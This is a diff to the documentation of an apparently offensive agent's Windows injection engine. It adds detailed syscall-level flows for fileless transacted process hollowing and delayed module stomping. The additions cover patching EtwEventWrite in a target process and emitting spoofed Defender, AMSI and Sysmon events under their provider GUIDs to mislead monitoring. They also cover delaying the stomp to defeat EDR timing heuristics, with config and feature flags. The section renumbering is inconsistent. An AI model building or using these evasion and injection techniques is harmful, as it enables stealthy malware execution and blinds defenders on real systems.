@@ -13,6 +13,7 @@ The injection engine (`agent/src/injection/` — Windows, gated by `#[cfg(target
 | Technique | Stealth | Reliability | Complexity | Best For |
 |-----------|---------|-------------|------------|----------|
 | **Process Hollowing** | High | High | Medium | Long-lived payloads |
+| **Transacted Hollowing** | Very High | High | High | Fileless hollowing with ETW blinding |
 | **Module Stomping** | Very High | High | High | Blending with loaded modules |
 | **Early Bird APC** | Medium | High | Low | Suspended/new processes |
 | **Thread Hijacking** | Very High | Medium | High | Avoiding new thread creation |
@@ -206,7 +207,211 @@ fn cleanup(process_handle: HANDLE, thread_handle: HANDLE) {
 
 ---
 
-### 2. Module Stomping (Module Overloading)
+### 2. NTFS Transaction-Based Process Hollowing (`transacted-hollowing` feature)
+
+Like standard process hollowing, but uses an NTFS transaction to make the payload completely fileless on disk. The section mapping persists after the transaction is rolled back, but the file never existed.
+
+#### Attack Flow
+
+```
+1. NtCreateTransaction()
+   → transaction_handle
+   (fallback: RtlCreateTransaction via kernel32 ordinal)
+
+2. NtCreateFile(transaction_handle, temp_path, ...)
+   → Create file inside the transaction (not visible on disk)
+
+3. NtWriteFile(file_handle, payload)
+   → Write payload to transacted file
+
+4. NtCreateSection(SEC_COMMIT, pagefile-backed)
+   → section_handle (backed by transaction)
+
+5. NtMapViewOfSection(section_handle, CURRENT_PROCESS, PAGE_READWRITE)
+   → local_view
+   memcpy(local_view, payload)
+   NtUnmapViewOfSection(CURRENT_PROCESS, local_view)
+
+6. CreateProcessW(target_path, CREATE_SUSPENDED)
+   → process_handle, thread_handle
+
+7. [ETW Blinding] Patch EtwEventWrite in TARGET process ntdll:
+   NtReadVirtualMemory → find remote ntdll export
+   NtWriteVirtualMemory → overwrite first byte with 0xC3 (ret)
+
+8. NtMapViewOfSection(section_handle, target_process, PAGE_EXECUTE_READ)
+   → remote_base (payload mapped into target as RX)
+
+9. SetThreadContext(thread_handle, {RIP: remote_base + entry_point})
+   → Redirect execution
+
+10. NtRollbackTransaction(transaction_handle)
+    → Transaction rolled back, file never existed on disk
+    → Section mapping in target process remains valid
+
+11. [ETW Restore] Restore original EtwEventWrite byte in target
+
+12. NtResumeThread(thread_handle)
+    → Payload executes inside legitimate process
+```
+
+#### Why It's Fileless
+
+The key insight is that Windows allows section mappings to survive transaction rollback:
+
+```
+Timeline:
+  CreateTransaction  ─────────────────────────────────────┐
+  CreateFile (in txn) ────────────────────────────────────┤
+  WriteFile (payload) ────────────────────────────────────┤  ← File exists
+  CreateSection (SEC_COMMIT) ─────────────────────────────┤     only in
+  MapViewIntoTarget ──────────────────────────────────────┤     transaction
+  RollbackTransaction ────────────────────────────────────┘  ← File GONE
+  ResumeThread ──────────────────────────────────────────────  ← Section VALID
+```
+
+After rollback, no artifact exists on disk, but the section mapping in the target process remains valid because the memory manager holds a reference to the section object.
+
+#### ETW Blinding Details
+
+Remote ETW patching is performed on the **target** process (not the agent):
+
+1. **Find remote ntdll** — Use shared ASLR base (ntdll is at the same address in all processes on modern Windows)
+2. **Walk remote PE export table** — Read DOS header → PE header → export directory via `NtReadVirtualMemory`
+3. **Resolve `EtwEventWrite`** — Binary search the export name table
+4. **Patch** — Write `0xC3` (RET) to first byte via `NtWriteVirtualMemory`
+5. **Fake events** — Emit 5 spoofed ETW events with Defender/AMSI/Sysmon provider GUIDs
+6. **Restore** — Write original byte back after `NtResumeThread`
+
+#### Fake ETW Events
+
+| Event | Provider GUID | Description |
+|-------|--------------|-------------|
+| Defender Scan Start | `{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}` | Fake quick scan started |
+| AMSI Scan Clean | `{79f7af20-2b5e-4cb1-8b6e-396376e8f8e8}` | Content marked as clean |
+| Sysmon Process Create | `{5770385f-c22a-43e0-bf4c-06f5698ffbd9}` | Benign process creation |
+| Defender No Threats | `{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}` | Scan completed, no threats |
+| Sysmon Network Connect | `{5770385f-c22a-43e0-bf4c-06f5698ffbd9}` | Legitimate network connection |
+
+#### Auto-Selection Ranking
+
+```
+WTH > ContextOnly > SectionMapping > NtSetInfoProcess > CallbackInjection
+  > TransactedHollowing > ProcessHollow > DelayedModuleStomp > ModuleStomp
+  > EarlyBirdApc > ThreadPool > ThreadHijack > FiberInject
+```
+
+`TransactedHollowing` is ranked above standard `ProcessHollow` because it leaves no disk artifacts. The `prefer_over_hollowing` config flag (default: true) controls this.
+
+`DelayedModuleStomp` is ranked above standard `ModuleStomp` because it defeats EDR timing heuristics by waiting for the initial-scan window to pass before stomping. The `prefer_over_stomp` config flag (default: true) controls this.
+
+#### Configuration
+
+```toml
+[injection.transacted_hollowing]
+enabled = true
+prefer_over_hollowing = true
+etw_blinding = true
+rollback_timeout_ms = 5000
+```
+
+#### Feature Flag
+
+```toml
+transacted-hollowing = ["direct-syscalls"]
+```
+
+Requires `direct-syscalls` because it uses `get_syscall_id` + `do_syscall` for all NT API calls.
+
+---
+
+### 3. Delayed Module Stomping (Delayed Module Overloading)
+
+Two-phase variant of module stomping that defeats EDR timing heuristics. Loads a sacrificial DLL, waits for a configurable randomized delay (default 8–15 seconds), then overwrites the DLL's `.text` section with the payload.
+
+#### Why Delayed?
+
+Many EDR products record DLL load times and flag modules whose code changes within a short window after `LoadLibrary` returns. The delayed stomp waits well beyond the typical 1–3 second scan window so the `.text` modification blends into normal background memory activity.
+
+#### Two-Phase Syscall Sequence
+
+**Phase 1 (immediate — returns to caller):**
+
+```
+1. NtOpenProcess(PROCESS_ALL_ACCESS, target_pid)
+   → process_handle
+
+2. NtQueryInformationProcess(ProcessBasicInformation)
+   → PEB address → walk Ldr.InMemoryOrderModuleList
+   → enumerate loaded modules
+
+3. Select sacrificial DLL NOT already loaded
+   (from ~30 candidates: version.dll, dwmapi.dll, msctf.dll, ...)
+
+4. NtAllocateVirtualMemory(path_buf, MEM_COMMIT, PAGE_READWRITE)
+   NtWriteVirtualMemory(dll_path)
+   NtCreateThreadEx(LoadLibraryA, path_buf)
+   NtWaitForSingleObject(thread) — wait for DLL to load
+   NtFreeVirtualMemory(path_buf)
+
+5. Re-enumerate modules to find loaded DLL base address
+
+→ Returns JSON: { status: "phase1_complete", target_pid, dll_name,
+                   dll_base, delay_secs }
+```
+
+**Phase 2 (background thread, after delay):**
+
+```
+6. Read DOS header → NT headers → section table
+   Find .text section (first executable section)
+
+7. NtProtectVirtualMemory(.text, PAGE_EXECUTE_READWRITE)
+   NtWriteVirtualMemory(.text, payload)
+   NtProtectVirtualMemory(.text, PAGE_EXECUTE_READ)
+   → Stomp .text section with payload
+
+8. If PE payload:
+   Parse relocation directory from payload buffer
+   Apply IMAGE_REL_BASED_DIR64 / HIGHLOW fixups
+   Entry = dll_base + payload.entry_point_rva
+   If shellcode:
+   Entry = .text section start
+
+9. NtCreateThreadEx(entry_point)
+   → Execute payload in target process
+```
+
+#### Evasion Properties
+
+| Property | Mechanism |
+|----------|-----------|
+| **Timing heuristic bypass** | 8–15s delay defeats "code changed shortly after load" |
+| **Legitimate module appearance** | Payload runs from a normally loaded DLL |
+| **Indirect syscalls** | All NT API calls via `do_syscall` through gadgets |
+| **No new allocations** | Reuses existing DLL memory (no alloc triad) |
+| **Non-blocking** | Phase 2 runs in background thread |
+
+#### Configuration
+
+```toml
+[injection.delayed_stomp]
+enabled = true
+min-delay-secs = 8
+max-delay-secs = 15
+prefer-over-stomp = true
+# sacrificial-dlls = ["version.dll", "dwmapi.dll", "msctf.dll", ...]
+```
+
+#### Feature Flag
+
+```toml
+delayed-stomp = ["direct-syscalls"]
+```
+
+---
+
+### 4. Module Stomping (Module Overloading)
 
 Loads a legitimate DLL, then overwrites its memory with the payload. The payload appears as a legitimate loaded module in the process's module list.
 
@@ -253,7 +458,7 @@ Loads a legitimate DLL, then overwrites its memory with the payload. The payload
 
 ---
 
-### 3. Early Bird APC Injection
+### 4. Early Bird APC Injection
 
 Queues an APC to a thread in a newly created (suspended) process. The APC executes before the process's main thread starts.
 
@@ -287,7 +492,7 @@ Queues an APC to a thread in a newly created (suspended) process. The APC execut
 
 ---
 
-### 4. Thread Hijacking
+### 5. Thread Hijacking
 
 Hijacks an existing thread in the target process by modifying its context (register state) to redirect execution.
 
@@ -339,7 +544,7 @@ Hijacks an existing thread in the target process by modifying its context (regis
 
 ---
 
-### 5. ThreadPool Injection
+### 6. ThreadPool Injection
 
 Injects shellcode by queuing work items to the target process's thread pool. No new thread creation, no remote thread creation — the process's own thread pool threads execute the payload.
 
@@ -381,7 +586,7 @@ Injects shellcode by queuing work items to the target process's thread pool. No 
 
 ---
 
-### 6. Fiber Injection
+### 7. Fiber Injection
 
 Converts a thread to a fiber, creates a new fiber with the payload, and switches to it. Fibers are user-mode scheduled and don't trigger kernel thread creation alerts.
 
@@ -421,7 +626,7 @@ Converts a thread to a fiber, creates a new fiber with the payload, and switches
 
 ---
 
-### 7. ThreadPool Injection — Extended Variants
+### 8. ThreadPool Injection — Extended Variants
 
 The ThreadPool injection technique has been expanded to **8 sub-variants**, each
 using a different thread pool work-dispatch mechanism. This variety allows the
@@ -449,7 +654,7 @@ The engine automatically selects the variant based on target process reconnaissa
 
 ---
 
-### 8. Context-Only Injection
+### 9. Context-Only Injection
 
 Performs a minimal thread-context hijack without injecting any shellcode.
 The attacker-supplied function address is written directly into the RIP
@@ -484,7 +689,7 @@ change — only a `CONTEXT` structure modification.
 
 ---
 
-### 9. Section Mapping Injection
+### 10. Section Mapping Injection
 
 Creates a shared section object (via `NtCreateSection`), maps it into both the
 agent and the target process, and writes the payload via the local mapping.
@@ -688,6 +893,7 @@ Each error includes a human-readable description and the failing NTSTATUS code w
 | `context-only` | Enables Context-Only injection technique |
 | `section-map` | Enables Section Mapping injection technique |
 | `callback-inject` | Enables Callback injection technique (12 APIs) |
+| `transacted-hollowing` | Enables NTFS transaction-based process hollowing with ETW blinding |
 | `direct-syscalls` | All techniques use direct syscalls via `nt_syscall` crate |
 
 ---
